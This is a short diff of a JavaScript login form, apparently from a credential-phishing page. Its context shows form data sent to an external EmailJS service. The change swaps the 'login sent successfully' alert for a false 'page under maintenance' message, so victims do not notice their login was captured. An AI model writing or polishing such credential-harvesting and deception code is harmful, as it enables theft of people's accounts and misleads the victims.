@@ -14,7 +14,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
         emailjs.send("service_9ft48yi", "template_e4bwoyk", templateParams)
             .then(function (response) {
-                alert("Inicio de sesión enviado correctamente.");
+                alert("Lo sentimos, pagina en mantenimiento");
                 document.getElementById("login-form").reset();
             }, function (error) {
                 alert("Error al enviar los datos. Inténtalo de nuevo.");
